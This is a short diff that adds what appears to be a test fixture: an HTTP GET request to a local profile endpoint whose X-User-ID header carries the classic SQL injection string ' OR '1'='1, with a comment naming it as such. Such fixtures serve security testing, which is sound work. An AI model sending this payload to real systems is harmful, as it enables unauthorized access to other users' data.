@@ -1,0 +1,6 @@
+GET /api/user/profile HTTP/1.1
+Host: localhost:8080
+X-User-ID: ' OR '1'='1
+Accept: application/json
+
+# SQL Injection Payload: ' OR '1'='1
